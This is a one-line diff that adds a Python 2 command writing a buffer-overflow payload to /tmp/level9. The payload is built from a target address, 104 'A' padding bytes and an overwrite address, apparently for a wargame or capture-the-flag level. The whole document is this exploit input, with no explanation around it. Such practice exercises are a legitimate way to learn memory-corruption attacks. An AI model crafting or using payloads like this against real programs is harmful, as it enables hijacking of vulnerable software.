@@ -1,0 +1,1 @@
+python -c "print '\x11\xff\xff\xbf' + 'A' * 104 + '\x0c\xa0\x04\x08'" > /tmp/level9
